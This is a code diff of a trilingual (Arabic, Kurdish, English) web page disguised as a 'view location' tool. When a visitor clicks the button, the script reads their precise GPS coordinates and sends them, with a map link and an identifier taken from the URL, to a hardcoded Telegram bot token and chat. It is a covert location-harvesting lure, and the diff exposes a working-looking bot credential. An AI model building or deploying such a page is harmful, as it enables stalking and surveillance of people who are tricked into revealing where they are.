@@ -141,6 +141,11 @@
             transform: scale(1.03);
         }
 
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
         .note {
             margin-top: 20px;
             font-size: 13px;
@@ -150,18 +155,6 @@
         #result {
             margin-top: 15px;
             font-weight: bold;
-        }
-        
-        .open-browser-btn {
-            margin-top: 15px;
-            padding: 12px 20px;
-            background: #007aff;
-            color: #fff;
-            border: none;
-            border-radius: 25px;
-            font-size: 14px;
-            cursor: pointer;
-            display: none;
         }
     </style>
 </head>
@@ -188,12 +181,8 @@
             </p>
         </div>
 
-        <button id="btnStart" class="btn" onclick="getLoc()" data-i18n="start_btn">
+        <button id="btnStart" class="btn" data-i18n="start_btn">
             📍 لعرض الموقع الدقيق اضغط هنا
-        </button>
-        
-        <button id="btnOpenBrowser" class="open-browser-btn" style="display:none;">
-            🔗 فتح في المتصفح
         </button>
 
         <div id="result"></div>
@@ -217,8 +206,7 @@
                 success: "✅ تم تأكيد موقعك",
                 done: "✅ تم",
                 error_prefix: "❌ فشل: ",
-                retry: "📍 إعادة المحاولة",
-                open_browser: "🔗 فتح في المتصفح الخارجي"
+                retry: "📍 إعادة المحاولة"
             },
             ckb: {
                 page_title: "پیشاندانی شوێن",
@@ -232,8 +220,7 @@
                 success: "✅ شوێنەکەت پشتڕاست کرایەوە",
                 done: "✅ تەواو",
                 error_prefix: "❌ شکست: ",
-                retry: "📍 دووبارە هەوڵبدەرەوە",
-                open_browser: "🔗 کردنەوە لە وێبگەڕی دەرەکی"
+                retry: "📍 دووبارە هەوڵبدەرەوە"
             },
             en: {
                 page_title: "View Location",
@@ -247,8 +234,7 @@
                 success: "✅ Your location confirmed",
                 done: "✅ Done",
                 error_prefix: "❌ Failed: ",
-                retry: "📍 Retry",
-                open_browser: "🔗 Open in External Browser"
+                retry: "📍 Retry"
             }
         };
 
@@ -270,157 +256,60 @@
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
             localStorage.setItem('preferred_lang_gps', lang);
-
-            const btn = document.getElementById('btnStart');
-            const btnOpen = document.getElementById('btnOpenBrowser');
-            if (btn.disabled && btn.textContent.includes('⏳')) {
-                btn.textContent = translations[lang].loading;
-            } else if (btn.textContent.includes('✅')) {
-                btn.textContent = translations[lang].done;
-            } else {
-                btn.textContent = translations[lang].start_btn;
-            }
-            btnOpen.textContent = translations[lang].open_browser;
         }
 
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
-            
-            // پشکنینی ئایا لە WebView ی مەسنجەرە
-            const isFacebookApp = /FBAN|FBAV/.test(navigator.userAgent);
-            if (isFacebookApp) {
-                document.getElementById('btnOpenBrowser').style.display = 'block';
-                document.getElementById('btnOpenBrowser').addEventListener('click', openInExternalBrowser);
-            }
         });
-
-        function openInExternalBrowser() {
-            const currentUrl = window.location.href;
-            // هەوڵدان بۆ کردنەوە لە وێبگەڕی دەرەکی
-            window.open(currentUrl, '_blank');
-        }
 
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
         const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
-        // پشکنینی GPS پشتگیری دەکرێت
-        function checkGPSHardware() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                // تاقیکردنەوەی خێرا بۆ دڵنیابوون لە هاردوەر
-                navigator.geolocation.getCurrentPosition(
-                    () => resolve(true),
-                    (err) => {
-                        if (err.code === 2) { // POSITION_UNAVAILABLE
-                            resolve(false);
-                        } else {
-                            resolve(true); // مۆڵەت کێشەیە نەک هاردوەر
-                        }
-                    },
-                    { timeout: 3000, enableHighAccuracy: true }
-                );
-            });
-        }
+        document.getElementById('btnStart').addEventListener('click', getLoc);
 
         async function getLoc() {
             const btn = document.getElementById('btnStart');
             const res = document.getElementById('result');
             const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
 
-            if (!navigator.geolocation) {
-                res.textContent = translations[currentLang].error_prefix + 'GPS not supported';
-                return;
-            }
-
             btn.disabled = true;
             btn.textContent = translations[currentLang].loading;
             res.textContent = '';
             res.style.display = 'block';
 
-            // چەند هەوڵێک بۆ وەرگرتنی شوێنی ورد
-            let bestPosition = null;
-            let bestAccuracy = Infinity;
+            try {
+                const position = await new Promise((resolve, reject) =>
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000
+                    })
+                );
 
-            for (let attempt = 0; attempt < 3; attempt++) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        const watchId = navigator.geolocation.watchPosition(
-                            (pos) => {
-                                // ئەگەر دەستکەوتی وردتر بوو، وەریبگرە
-                                if (pos.coords.accuracy < bestAccuracy) {
-                                    bestAccuracy = pos.coords.accuracy;
-                                    bestPosition = pos;
-                                    // ئەگەر وردییەکەی کەمتر لە 30 مەتر بوو، بەسە
-                                    if (pos.coords.accuracy <= 30) {
-                                        navigator.geolocation.clearWatch(watchId);
-                                        resolve(pos);
-                                    }
-                                }
-                            },
-                            reject,
-                            {
-                                enableHighAccuracy: true,
-                                timeout: 10000,
-                                maximumAge: 0  // ڕێگە نادات شوێنی کۆن بەکاربهێنرێت
-                            }
-                        );
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
 
-                        // دوای ٨ چرکە باشترین شوێن بەکاردێنە
-                        setTimeout(() => {
-                            navigator.geolocation.clearWatch(watchId);
-                            if (bestPosition) {
-                                resolve(bestPosition);
-                            } else {
-                                reject(new Error('Timeout'));
-                            }
-                        }, 8000);
-                    });
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-                    // گەیشتینە ئەنجامێکی باش
-                    break;
-                } catch (e) {
-                    if (attempt === 2) {
-                        // دوای ٣ هەوڵ، یان باشترین ئەنجام یان هەڵە
-                        if (bestPosition) break;
-                        throw e;
-                    }
-                    // چاوەڕوانی ١ چرکە پێش هەوڵی دووبارە
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
+                res.textContent = translations[currentLang].success;
+                btn.textContent = translations[currentLang].done;
+
+            } catch (e) {
+                res.textContent = translations[currentLang].error_prefix + e.message;
+                btn.disabled = false;
+                btn.textContent = translations[currentLang].retry;
             }
-
-            if (!bestPosition) {
-                throw new Error('Location not available');
-            }
-
-            const lat = bestPosition.coords.latitude;
-            const lng = bestPosition.coords.longitude;
-            const accuracy = Math.round(bestPosition.coords.accuracy);
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-            const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🎯 الدقة: ${accuracy} متر\n🗺️ ${mapsLink}`;
-
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            res.textContent = translations[currentLang].success + ` (${accuracy}m)` ;
-            btn.textContent = translations[currentLang].done;
-
-        } catch (e) {
-            btn.disabled = false;
-            btn.textContent = translations[currentLang].retry;
-            res.textContent = translations[currentLang].error_prefix + e.message;
         }
     </script>
 </body>
